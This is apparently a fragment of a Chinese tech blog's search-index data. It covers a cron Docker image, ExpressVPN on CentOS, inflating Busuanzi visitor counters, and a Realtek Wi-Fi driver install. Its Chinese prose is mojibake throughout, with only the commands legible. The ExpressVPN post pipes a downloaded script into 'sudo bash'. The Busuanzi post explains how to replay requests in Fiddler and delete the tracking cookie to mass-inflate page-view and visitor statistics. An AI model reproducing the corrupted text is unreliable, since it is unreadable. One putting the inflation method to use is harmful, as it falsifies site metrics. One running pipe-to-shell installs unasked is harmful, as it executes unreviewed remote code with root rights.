http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN apt-get -y update &amp;&amp; apt-get -y upgradeRUN apt-get -y install cron rsyslog apt-utils net-tools telnet wget curl vimRUN apt-get -y autoclean &amp;&amp; apt-get -y autoremoveRUN sed -i "s/#cron./cron./g" /etc/rsyslog.confRUN echo "0 */2 * * * root /usr/bin/python3 /usr/share/python_scripts/mysql-sync.py" &gt;&gt; /etc/crontabRUN echo "59 23 * * * root /usr/bin/python2 /usr/share/python_scripts/mysql-check.py" &gt;&gt; /etc/crontabCMD service rsyslog start &amp;&amp; service cron start &amp;&amp; tail -f -n 20 /var/log/cron.log å°†ä¸Šé¢çš„å†…å®¹ä¿å­˜åˆ° Dockerfile-Crontab æ–‡ä»¶ä¸­ï¼Œç„¶åä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ„å»º Crontab é•œåƒ 1# docker build -f Dockerfile-Crontab -t clay/crontab:1.0 . ä½¿ç”¨ Docker-Compose æ¥ç®¡ç† Crontab é•œåƒï¼Œå…¶ä¸­ Docker-Compose çš„é…ç½®æ–‡ä»¶å†…å®¹å¦‚ä¸‹ 12345678910version: "3.5"services: crontab: image: clay/crontab:1.0 container_name: crontab volumes: - /usr/local/python_scripts:/usr/share/python_scripts restart: always network_mode: bridge åˆ›å»ºå¹¶åå°å¯åŠ¨ Crontab å®¹å™¨ 1# docker-compose up -d Crontab å‘½ä»¤åœ¨çº¿ç”Ÿæˆå·¥å…· Crontab Generator å‚è€ƒèµ„æ–™ Linux ä¸­çš„ Crontab å®šæ—¶ä»»åŠ¡ Crontab å®šæ—¶ä»»åŠ¡ä¸æ‰§è¡Œçš„ä¸€äº›åŸå› æ€»ç»“ ä½¿ç”¨ Shell è„šæœ¬æˆ–å‘½ä»¤è¡Œæ·»åŠ  Crontab å®šæ—¶ä»»åŠ¡ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"Centos7 å®‰è£… ExpressVPN å®¢æˆ·ç«¯",url:"/posts/4d31c632.html",text:'å‰è¨€ExpressVPN ä»‹ç» ExpressVPN å®˜ç½‘ ExpressVPN çš„ä¼˜åŠ¿ ExpressVPN æ”¯æŒçš„è·¯ç”±å™¨å‹å· ExpressVPN æ”¯æŒçš„æ‰€æœ‰è®¾å¤‡ç±»å‹ ExpressVPN æ”¯æŒåŒä¸€ä¸ªè´¦å·æœ€å¤š 5 ä¸ªè®¾å¤‡åŒæ—¶ä½¿ç”¨ ExpressVPN å¦‚ä½•æ”¯æŒ 5 ä¸ªä»¥ä¸Šçš„è®¾å¤‡åŒæ—¶ä½¿ç”¨ä¸€ä¸ªè´¦å· å¿«é€Ÿå…¥é—¨ExpressVPN å®¢æˆ·ç«¯å®‰è£…åœ¨ ExpressVPN å®˜ç½‘ä¸‹è½½ Fedora 64-bit ç‰ˆçš„å®¢æˆ·ç«¯ï¼Œé€šè¿‡å‘½ä»¤å®‰è£…å®¢æˆ·ç«¯ 1# yum install expressvpn-3.4.2.4-1.x86_64.rpm æ¿€æ´»ï¼Œåªéœ€è¦æ‹·è´ ExpressVPN çš„æ¿€æ´»ç åˆ°ç»ˆç«¯ï¼Œç„¶åæŒ‰ä¸‹å›è½¦é”®å³å¯ 1$ expressvpn activate å¯ä»¥é€‰æ‹©é€šè¿‡å…±äº«åŒ¿åè¯Šæ–­æŠ¥å‘Šæ¥å¸®åŠ©æ”¹è¿› ExpressVPN ï¼Œè¾“å…¥ Y æ¥å—ï¼Œæˆ–è¾“å…¥ n æ‹’ç» å¦‚æœå¸Œæœ›ä»¥åä¸å†é€‰æ‹©å‘ ExpressVPN å‘é€è¯Šæ–­æŠ¥å‘Šï¼Œå¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ 1$ expressvpn preferences set send_diagnostics false ExpressVPN å®¢æˆ·ç«¯å¸è½½1# yum remove expressvpn å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå¦‚æœæ—¥åéœ€è¦æ›´æ–° ExpressVPN çš„å®¢æˆ·ç«¯ï¼Œåªéœ€è¦å…ˆå¸è½½æ—§ç‰ˆçš„å®¢æˆ·ç«¯ï¼Œç„¶åå†å®‰è£…æ–°ç‰ˆçš„å®¢æˆ·ç«¯å³å¯ ExpressVPN å®¢æˆ·ç«¯è¿æ¥æœåŠ¡å™¨è¿æ¥ VPN æœåŠ¡å™¨ï¼Œå¦‚æœæ˜¯ç¬¬ä¸€æ¬¡è¿æ¥ï¼ŒExpressVPN å°†ä½¿ç”¨ â€œæ™ºèƒ½ä½ç½®â€ åŠŸèƒ½æ¥é€‰æ‹©æœåŠ¡å™¨ä½ç½®ï¼Œè¿™æ˜¯æ ¹æ®é€Ÿåº¦å’Œé‚»è¿‘æ€§ç­‰å› ç´ æ¨èçš„ã€‚å¦‚æœä¸æ˜¯ç¬¬ä¸€æ¬¡è¿æ¥ï¼ŒExpressVPN å°†è¿æ¥åˆ°æœ€è¿‘è¿æ¥è¿‡çš„æœåŠ¡å™¨ä½ç½® 1$ expressvpn connect é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœæˆåŠŸè¿æ¥åˆ° VPN æœåŠ¡å™¨ï¼Œåœ¨ç³»ç»Ÿçš„é€šçŸ¥é¢æ¿é‡Œå°†çœ‹åˆ°ä¸€æ¡æŒ‡ç¤º ExpressVPN å·²è¿æ¥çš„é€šçŸ¥ å½“å•ä¸ª ExpressVPN è´¦å·è¶…è¿‡ 5 å°è®¾å¤‡åŒæ—¶ä½¿ç”¨æ—¶ï¼Œç»ˆç«¯ä¼šè¾“å‡ºä»¥ä¸‹é”™è¯¯æ—¥å¿—ä¿¡æ¯ éªŒè¯æ˜¯å¦å¯ä»¥æ­£å¸¸è¿æ¥åˆ° VPN æœåŠ¡å™¨ 1$ curl -I www.google.com æ–­å¼€ VPN è¿æ¥ï¼Œå¯ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ 1$ expressvpn disconnect è¿›é˜¶ä½¿ç”¨ExpressVPN ç½‘é€Ÿæµ‹è¯•å®‰è£…å¹¶ä½¿ç”¨ Speedtest CLI å·¥å…·æ¥æµ‹è¯• ExpressVPN çš„å®é™…è¿æ¥é€Ÿåº¦ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ Speedtest çš„ Python ç‰ˆ æˆ–è€… Speedtest çš„ç½‘é¡µç‰ˆè¿›è¡Œæµ‹è¯•ã€‚ 123456789101112131415161718# å¸è½½å…¶ä»–ç‰ˆæœ¬çš„ Speedtest# rpm -qa | grep speedtest | xargs -I {} sudo yum -y remove {}# å®‰è£… Speedtest# curl -s https://install.speedtest.net/app/cli/install.rpm.sh | sudo bash# yum install speedtest# å¼€å§‹ç½‘é€Ÿæµ‹è¯•$ speedtest# æˆ–è€…æŒ‡å®š Speedtest çš„ç½‘é€Ÿæ˜¾ç¤ºå•ä½$ speedtest -u kB/s# æç¤ºï¼šSpeedtest CLI æ”¯æŒçš„å•ä½å¦‚ä¸‹ï¼šDecimal prefix, bits per second: bps, kbps, Mbps, GbpsDecimal prefix, bytes per second: B/s, kB/s, MB/s, GB/sBinary prefix, bits per second: kibps, Mibps, GibpsBinary prefix, bytes per second: kiB/s, MiB/s, GiB/s ExpressVPN å®¢æˆ·ç«¯å¸¸ç”¨ç®¡ç†å‘½ä»¤12345678# æ˜¾ç¤ºæ‰€æœ‰æ¨èçš„ VPN æœåŠ¡å™¨ä½ç½®$ expressvpn list# æ˜¾ç¤ºæ‰€æœ‰æœ‰æ•ˆçš„ VPN æœåŠ¡å™¨ä½ç½®$ expressvpn list all# æ˜¾ç¤ºæœ€è¿‘è¿æ¥è¿‡çš„ä¸‰ä¸ª VPN æœåŠ¡å™¨ä½ç½®$ expressvpn list recent 12345# è¿æ¥åˆ°æ™ºèƒ½æ¨èçš„ VPN æœåŠ¡å™¨ä½ç½®$ expressvpn connect smart# è¿æ¥åˆ°ç‰¹å®šçš„ VPN æœåŠ¡å™¨ä½ç½®$ expressvpn connect "Hong Kong - 2" 12345678# è®¾ç½® ExpressVPN ä½¿ç”¨ TCP ä½œä¸º VPN åè®®$ expressvpn protocol tcp# è®¾ç½® ExpressVPN ä½¿ç”¨ UDP ä½œä¸º VPN åè®®$ expressvpn protocol udp# è®¾ç½® ExpressVPN è‡ªåŠ¨é€‰æ‹© VPN åè®®ï¼ŒåŒ…æ‹¬ lightway_udpã€tcpã€udp åè®®$ expressvpn protocol auto 12345# è®¾ç½® ExpressVPN åœ¨å¯åŠ¨æ—¶è‡ªåŠ¨è¿æ¥åˆ°ä¸Šæ¬¡è¿æ¥è¿‡çš„ VPN æœåŠ¡å™¨ä½ç½®$ expressvpn autoconnect true# ç¦ç”¨ ExpressVPN åœ¨å¯åŠ¨æ—¶è‡ªåŠ¨è¿æ¥$ expressvpn autoconnect false 12345# æŸ¥çœ‹ ExpressVPN å½“å‰çš„è¿æ¥çŠ¶æ€$ expressvpn status# æŸ¥çœ‹ ExpressVPN çš„åå°æœåŠ¡çŠ¶æ€$ systemctl status expressvpn 12345678# æŸ¥çœ‹ ExpressVPN å½“å‰çš„é…ç½®ä¿¡æ¯$ expressvpn preferences# è·å– ExpressVPN ç‰¹å®šçš„é…ç½®ä¿¡æ¯$ expressvpn preferences get desktop_notifications# è®¾ç½® ExpressVPN ç‰¹å®šçš„é…ç½®ä¿¡æ¯$ expressvpn preferences set desktop_notifications false 12# æŸ¥çœ‹ ExpressVPN çš„å‘½ä»¤å¸®åŠ©æ–‡æ¡£$ man expressvpn ExpressVPN Chrome æµè§ˆå™¨æ’ä»¶å®‰è£…å¦‚æœå¸Œæœ›ä½¿ç”¨å›¾å½¢ç”¨æˆ·ç•Œé¢ï¼ˆGUIï¼‰æ¥ç®¡ç† ExpressVPN çš„ Linux å®¢æˆ·ç«¯ï¼Œåˆ™å¯ä»¥ä½¿ç”¨é€‚ç”¨äº Chrome çš„ ExpressVPN æµè§ˆå™¨æ’ä»¶æ¥å®ç°ã€‚åœ¨ Chrome çš„åº”ç”¨å•†åº—é‡Œå®‰è£… ExpressVPN æ’ä»¶ï¼Œç„¶åç®€å•é…ç½® Chrome æµè§ˆå™¨æ’ä»¶å³å¯ã€‚ç‰¹åˆ«æ³¨æ„ï¼Œè¦ä½¿ç”¨ Chrome çš„æµè§ˆå™¨æ’ä»¶ï¼Œéœ€è¦ç¡®ä¿å·²ä¸‹è½½å¹¶æ¿€æ´» ExpressVPN çš„ Linux å®¢æˆ·ç«¯ã€‚ é«˜çº§ä½¿ç”¨ExpressVPN ä½¿ç”¨å»ºè®® å»ºè®®ä¼˜å…ˆä½¿ç”¨é€Ÿåº¦è¾ƒå¿«çš„ lightway_udp åè®®ï¼Œå…¶æ¬¡æ‰æ˜¯ tcpã€udp åè®® Centos 7 å®‰è£… ExpressVPN çš„å®¢æˆ·ç«¯åï¼Œé»˜è®¤çš„ VPN ä»£ç†æ˜¯ç³»ç»Ÿå…¨å±€ä»£ç† ç”±äº ExpressVPN çš„å®¢æˆ·ç«¯æ˜¯ç³»ç»Ÿå…¨å±€ä»£ç†ï¼Œå› æ­¤ä¸éœ€è¦é¢å¤–çš„é…ç½®å°±å¯ä»¥ç›´æ¥åœ¨ Centos 7 ç³»ç»Ÿå†…çš„ç»ˆç«¯ã€æµè§ˆå™¨ä½¿ç”¨ VPN ä»£ç† ç”±äº ExpressVPN çš„å®¢æˆ·ç«¯æ˜¯ç³»ç»Ÿå…¨å±€ä»£ç†ï¼Œå› æ­¤ä¸éœ€è¦é¢å¤–çš„é…ç½®å°±å¯ä»¥ç›´æ¥è®© Centos 7 ç³»ç»Ÿå†…çš„æ‰€æœ‰ç”¨æˆ·ç›´æ¥ä½¿ç”¨ VPN ä»£ç†ï¼ŒåŒ…æ‹¬ç»ˆç«¯ã€æµè§ˆå™¨ ExpressVPN å®¢æˆ·ç«¯çš„é»˜è®¤é…ç½®é¡¹å¦‚ä¸‹ï¼š 12345678auto_connect falsedesktop_notifications falsedisable_ipv6 trueforce_vpn_dns truelightway_cipher autonetwork_lock defaultpreferred_protocol autosend_diagnostics true Docker å®‰è£… ExpressVPN æ„å»º Privoxyã€Torã€ExpressVPN çš„ Docker é•œåƒ Linux å®ç°å›½å†…å¤–æµé‡åˆ†æµExpressVPN æ”¯æŒåœ¨ Windowsã€Macã€Androidã€Router ç³»ç»Ÿä¸Šä½¿ç”¨éš§é“åˆ†æµåŠŸèƒ½ï¼ˆå³å›½å†…å¤–æµé‡åˆ†æµï¼‰ï¼Œä½†ä¸æ”¯æŒåœ¨ Linux ç³»ç»Ÿä¸Šä½¿ç”¨éš§é“åˆ†æµåŠŸèƒ½ã€‚åœ¨ Linux ç¯å¢ƒä¸‹å¯ä»¥å°è¯•é€šè¿‡ Docker + Privoxy + SwitchyOmegaï¼ˆChrome æµè§ˆå™¨æ’ä»¶ï¼‰ æ¥å®ç°éš§é“åˆ†æµï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼ŒDocker è´Ÿè´£è¿è¡Œ ExpressVPN çš„æœåŠ¡ï¼ŒPrivoxy è´Ÿè´£ç½‘ç»œä»£ç†ï¼ŒSwitchyOmega è´Ÿè´£å›½å†…å¤–æµé‡åˆ†æµã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œä½¿ç”¨è¯¥æ–¹æ¡ˆä¹‹å ExpressVPN çš„ Chrome æµè§ˆå™¨æ’ä»¶å°±æ— æ³•æ­£å¸¸ä½¿ç”¨äº†ï¼Œæ­¤æ—¶éœ€è¦ä»å¤–éƒ¨è¿æ¥åˆ° Docker å®¹å™¨ï¼Œç„¶ååœ¨ç»ˆç«¯é‡Œä½¿ç”¨å‘½ä»¤è¡Œç®¡ç† ExpressVPN çš„æœåŠ¡ï¼Œäº²æµ‹è¯¥æ–¹æ¡ˆæœ‰æ•ˆã€‚ å®˜æ–¹æ•™ç¨‹ä¸è½¯ä»¶ä¸‹è½½ExpressVPN è½¯ä»¶ä¸‹è½½ ExpressVPN çš„ Linux å®¢æˆ·ç«¯ ExpressVPN çš„ Chrome æ’ä»¶ ExpressVPN çš„ Android å®¢æˆ·ç«¯ ExpressVPN çš„ Windows å®¢æˆ·ç«¯ ExpressVPN å®˜æ–¹æ•™ç¨‹ Linux é…ç½® DNS æœåŠ¡å™¨ Linux ç³»ç»Ÿä½¿ç”¨ ExpressVPN è·¯ç”±å™¨ç³»ç»Ÿä½¿ç”¨ ExpressVPN Windows ç³»ç»Ÿä½¿ç”¨ ExpressVPN Windowsã€Mac ç³»ç»Ÿè®¾ç½® ExpressVPN éš§é“åˆ†æµ å‚è€ƒèµ„æ–™ ExpressVPN è¿›é˜¶ä½¿ç”¨æ•™ç¨‹ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos å¼€å‘å·¥å…·"},{title:"ä¸è’œå­ç»Ÿè®¡æ•°æ®æ›´æ”¹",url:"/posts/fc73f615.html",text:'å‰è¨€ç”±äºä¸è’œå­ç»Ÿè®¡ä¸å¯¹æ™®é€šç”¨æˆ·æä¾›åå°ç®¡ç†çš„åŠŸèƒ½ï¼Œå½“ç«™ç‚¹çš„åŸŸåæ›´æ¢åï¼Œç½‘ç«™ä»¥å‰çš„æ‰€æœ‰ç»Ÿè®¡æ•°æ®éƒ½ä¼šé‡ç½®ä¸ºé›¶ã€‚ä¸‹é¢å°†ä»‹ç»å¦‚ä½•ä½¿ç”¨æŠ“åŒ…å·¥å…·æ¥åˆ†æä¸è’œå­ç»Ÿè®¡çš„ APIï¼Œè¿›è€Œå®ç°ä¸è’œå­ç»Ÿè®¡æ•°æ®çš„æ›´æ”¹ã€‚ Fiddler ä¸‹è½½è¿™é‡Œä½¿ç”¨äº† Fiddlerï¼Œå®ƒæ˜¯ä¸€æ¬¾æµè¡Œçš„æŠ“åŒ…å·¥å…·ï¼Œå¯ä»¥å°†ç½‘ç»œä¼ è¾“å‘é€ä¸æ¥å—çš„æ•°æ®åŒ…è¿›è¡Œæˆªè·ã€é‡å‘ã€ç¼–è¾‘ã€è½¬å­˜ç­‰æ“ä½œã€‚æœ¬è´¨ä¸Šï¼ŒFiddler æ˜¯é€šè¿‡æ”¹å†™ HTTP ä»£ç†ï¼Œè®©æ•°æ®ä»å®ƒé‚£é‡Œé€šè¿‡ï¼Œæ¥ç›‘æ§å¹¶ä¸”æˆªå–åˆ°ç½‘ç»œæ•°æ®ã€‚ Fiddler å®˜ç½‘ä¸‹è½½åœ°å€ ï¼šhttps://www.telerik.com/download/fiddler Fiddler ç¦»çº¿ä¸‹è½½åœ°å€ï¼šhttps://pan.baidu.com/s/1bpnp3Ef &nbsp;&nbsp;æå–ç ï¼š5skw æŠ“åŒ…åˆ†æ1ï¼‰å¯åŠ¨ Fiddler åï¼Œæ‰“å¼€æœ¬åœ°çš„æµè§ˆå™¨è®¿é—®åšå®¢çš„ URLï¼Œæ­¤æ—¶åœ¨ Fiddler çš„ç•Œé¢ä¸Šå¯ä»¥çœ‹åˆ°æœ‰å…³ä¸è’œå­çš„è¯·æ±‚ 1https://busuanzi.ibruce.info/busuanzi?jsonpCallback=BusuanziCallback_195655659654 2ï¼‰è§‚å¯Ÿè¯·æ±‚çš„å“åº”ç»“æœï¼Œå¯ä»¥å‘ç°å…¶ä¸­åŒ…å«äº†ç½‘ç«™è®¿é—®é‡çš„æ•°æ®ï¼Œä¸è’œå­ç»Ÿè®¡å°±æ˜¯é€šè¿‡è¿™ä¸ªè¯·æ±‚æ¥ç»Ÿè®¡ç½‘ç«™çš„è®¿é—®é‡ï¼ŒåŒ…æ‹¬ site_pvã€site_uvã€page_pv 3ï¼‰é‡æ–°å‘é€ä¸€æ¡ä¸è’œå­è¯·æ±‚ï¼Œå³å‡»è¯¥è¯·æ±‚ï¼Œé€‰æ‹© Replay â€“&gt; Reissue Requests 4ï¼‰æŸ¥çœ‹è¯·æ±‚å“åº”çš„ç»“æœï¼Œå‘ç° page_pv å’Œ site_pv çš„å€¼éƒ½é€’å¢äº†ï¼Œåœ¨ç½‘é¡µç«¯æŸ¥çœ‹ä¹Ÿç¡®å®é€’å¢äº† (adsbygoogle = window.adsbygoogle || []).push({}); 5ï¼‰è®¿å®¢æ•° site_uv çš„å€¼ï¼Œè‡ªç„¶å°±æ˜¯é€šè¿‡ Cookie æ¥å®ç°äº† 6ï¼‰Cookie ä¸­æœ‰ä¸‰æ¡æ•°æ®ï¼Œå°è¯•åˆ é™¤ busuanziId åå†æ¬¡å‘é€è¯·æ±‚ã€‚é¦–å…ˆé€‰æ‹© Replay â€“&gt; Reissue and Editï¼Œåœ¨ Raw é€‰é¡¹é‡Œåˆ å» Cookie ä¸­çš„ busuanziId è¿™æ¡æ•°æ®ï¼Œç„¶åç‚¹å‡» Run to Completion å³å¯å‘é€è¯·æ±‚ 7ï¼‰ä»å“åº”ç»“æœå¯ä»¥çœ‹åˆ° site_uv å·²ç»åŠ  1 äº†ï¼ŒåŒæ—¶ page_pv å’Œ site_pv ä¹Ÿä¼šåˆ†åˆ«åŠ  1 æ›´æ”¹ç»Ÿè®¡æ•°æ®ç°åœ¨å°±å¯ä»¥ä½¿ç”¨ Fiddler çš„è‡ªåŠ¨æ‰¹é‡å‘åŒ…åŠŸèƒ½æ¥åˆ·è®¿å®¢æ•°å’Œè®¿é—®é‡äº†ï¼Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨ JMeter æ¥åˆ·ç»Ÿè®¡æ•°æ®ã€‚è‹¥åˆ·è®¿å®¢æ•°ï¼Œåˆ™é€‰ä¸­ä¿®æ”¹è¿‡ Cookie çš„è¯·æ±‚ï¼Œå³å‡»é€‰æ‹© Replay â€“&gt; Reissue Sequentiallyï¼Œè¾“å…¥ç›®æ ‡è®¿é—®äººæ•°å°±å¯ä»¥å¾ˆå¿«åˆ·ä¸Šå»äº† var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"çˆ¬è™«"},{title:"HarmonyOS å…¥é—¨æ•™ç¨‹ä¹‹ä¸€ HarmonyOS ç®€ä»‹",url:"/posts/658c60f7.html",text:'åšå®¢èµ„æ–™ HarmonyOS å®˜ç½‘ HarmonyOS åº”ç”¨å¼€å‘å®˜ç½‘ HarmonyOS è®¾å¤‡å¼€å‘å®˜ç½‘ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ç§»åŠ¨ç«¯"},{title:"Linux å®‰è£… RTL8812AU æ— çº¿ USB ç½‘å¡é©±åŠ¨",url:"/posts/e173757f.html",text:'å‰è¨€ æœ¬æ–‡ä¸»è¦ä»‹ç»å¦‚ä½•åœ¨ Linux ç³»ç»Ÿé‡Œå®‰è£… RTL8812AU æ— çº¿ USB ç½‘å¡é©±åŠ¨ï¼Œé€‚ç”¨äº Debianã€Ubuntu 18/19/20ã€Centos7/8ï¼Œå…¶ä¸­ Linux çš„å†…æ ¸ç‰ˆæœ¬å¿…é¡»ä¸ºå¤§äºç­‰äº 3.10ã€‚ æ£€æµ‹ç³»ç»Ÿæ˜¯å¦æ­£ç¡®è¯†åˆ« RTL8812AU æ— çº¿ç½‘å¡ 12# lsusb | grep RTL8812AUBus 003 Device 008: ID 0bda:8812 Realtek Semiconductor Corp. RTL8812AU 802.11a/b/g/n/ac 2T2R DB WLAN Adapter Ubuntu 18/19/20 æ‰‹åŠ¨å®‰è£… RTL8812AU æ— çº¿ç½‘å¡é©±åŠ¨ 12# ç³»ç»Ÿç¯å¢ƒLinux Ubuntu-20 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 12345678910111213141516171819# å®‰è£…å·¥å…·è½¯ä»¶# apt-get install -y git make# å…‹éš†æºç # git clone https://github.com/gnab/rtl8812au.git# è¿›å…¥æºç ç›®å½•# cd rtl8812au# ç¼–è¯‘é©±åŠ¨# make# å®‰è£…é©±åŠ¨# cp 8812au.ko /lib/modules/$(uname -r)/kernel/drivers/net/wireless# æ›´æ–°æ¨¡å—ä¾èµ–# depmod# æç¤ºï¼šæ‰§è¡Œå®Œä»¥ä¸Šæ­¥éª¤åï¼Œæ­£å¸¸æƒ…å†µä¸‹å°±å¯ä»¥åœ¨ç³»ç»Ÿçš„è®¾ç½®é¢æ¿é‡Œçœ‹åˆ° RTL8812AU æ— çº¿ USB ç½‘å¡æœç´¢åˆ°çš„ WiFi åˆ—è¡¨ï¼›å¦‚æœç½‘å¡é©±åŠ¨å®‰è£…åä¸ç”Ÿæ•ˆï¼Œå¯ä»¥å°è¯•é‡å¯ç³»ç»Ÿã€‚ Ubuntu 18/19/20 é€šè¿‡ DKMS å®‰è£… RTL8812AU æ— çº¿ç½‘å¡é©±åŠ¨ å½“æ‰‹åŠ¨å®‰è£… RTL8812AU æ— çº¿ç½‘å¡é©±åŠ¨åï¼Œå¦‚æœ Linux ç³»ç»Ÿçš„å†…æ ¸ç‰ˆæœ¬å‡çº§äº†ï¼Œé‚£ä¹ˆ RTL8812AU é©±åŠ¨å°±ä¼šå¤±æ•ˆï¼Œå¯¼è‡´éœ€è¦é‡æ–°å®‰è£…é©±åŠ¨æ‰èƒ½æ­£å¸¸ä½¿ç”¨æ— çº¿ç½‘å¡ã€‚ä¸ºäº†è§£å†³ Linux ç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬å‡çº§å¸¦æ¥çš„é—®é¢˜ï¼Œå¯ä»¥ é€šè¿‡ DKMS è‡ªåŠ¨é‡å»ºå¹¶å®‰è£…ç½‘å¡é©±åŠ¨åˆ°æ–°çš„å†…æ ¸ä¸­ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè‹¥é€šè¿‡ DKMS å®‰è£…ç½‘å¡é©±åŠ¨ï¼Œåˆ™æ— éœ€å†ä½¿ç”¨ä¸Šé¢çš„æ–¹æ³•æ‰‹åŠ¨å®‰è£…ç½‘å¡é©±åŠ¨äº†ã€‚ 1234567891011121314151617181920# å®‰è£…å·¥å…·è½¯ä»¶# apt-get install -y git make build-essential dkms# å…‹éš†æºç # git clone https://github.com/gnab/rtl8812au.git# è¿›å…¥æºç ç›®å½•# cd rtl8812au# å°†ç½‘å¡é©±åŠ¨å®‰è£…åˆ°DKMSï¼ˆè‹¥å‘½ä»¤æ‰§è¡Œå‡ºé”™ï¼Œè¯·çœ‹æœ¬æ–‡åé¢ç»™å‡ºçš„è§£å†³åŠæ³•ï¼‰# make dkms_install# æŸ¥çœ‹DKMSæ˜¯å¦æ­£ç¡®å®‰è£…ç½‘å¡é©±åŠ¨# dkms status8812au, 4.2.3, 5.4.0-42-generic, x86_64: installed# é…ç½®ç³»ç»Ÿå¼•å¯¼æ—¶è‡ªåŠ¨åŠ è½½ç½‘å¡é©±åŠ¨# echo 8812au | sudo tee -a /etc/modules# æç¤ºï¼šæ‰§è¡Œå®Œä»¥ä¸Šæ­¥éª¤åï¼Œæ­£å¸¸æƒ…å†µä¸‹å°±å¯ä»¥åœ¨ç³»ç»Ÿçš„è®¾ç½®é¢æ¿é‡Œçœ‹åˆ° RTL8812AU æ— çº¿ USB ç½‘å¡æœç´¢åˆ°çš„ WiFi åˆ—è¡¨ï¼›å¦‚æœç½‘å¡é©±åŠ¨å®‰è£…åä¸ç”Ÿæ•ˆï¼Œå¯ä»¥å°è¯•é‡å¯ç³»ç»Ÿã€‚ è‹¥æ‰§è¡Œ make dkms_install å‘½ä»¤å‡ºç°é”™è¯¯ Makefile:1085: *** unterminated call to function \'shell\': missing \')\'. Stopï¼Œæ­¤æ—¶å¯ä»¥æ›´æ”¹ Makefile çš„æ–‡ä»¶å†…å®¹åï¼Œå†æ¬¡æ‰§è¡Œ make dkms_install ç­‰å‘½ä»¤ã€‚ 123456789101112# è¿›å…¥æºç ç›®å½•# cd rtl8812au# æŸ¥çœ‹ç½‘å¡é©±åŠ¨çš„ç‰ˆæœ¬å·# cat include/rtw_version.hdefine DRIVERVERSION "v4.2.3"# ç¼–è¾‘Makefileæ–‡ä»¶ï¼Œæ‰‹åŠ¨æŒ‡å®šç½‘å¡é©±åŠ¨çš„å…·ä½“ç‰ˆæœ¬å·# vim MakefileDRIVER_VERSION = 4.2.3# æç¤ºï¼šå³æ‰¾åˆ°Makefileæ–‡ä»¶ä¸­çš„ DRIVER_VERSION = $(shell grep "#define DRIVERVERSION" include/rtw_version.h | awk \'{print $$3}\' | tr -d v\\")ï¼Œå¹¶å°†å…¶ä¿®æ”¹ä¸º DRIVER_VERSION = 4.2.3 è‹¥éœ€è¦ä» DKMS ä¸­å¸è½½ç½‘å¡é©±åŠ¨ï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š 12345# è¿›å…¥æºç ç›®å½•# cd rtl8812au# é€šè¿‡DKMSå¸è½½ç½‘å¡é©±åŠ¨# make dkms_remove Centos 7/8 YUM å®‰è£… RTL8812AU æ— çº¿ç½‘å¡é©±åŠ¨ ç”±äºäº²æµ‹åœ¨ Centos7 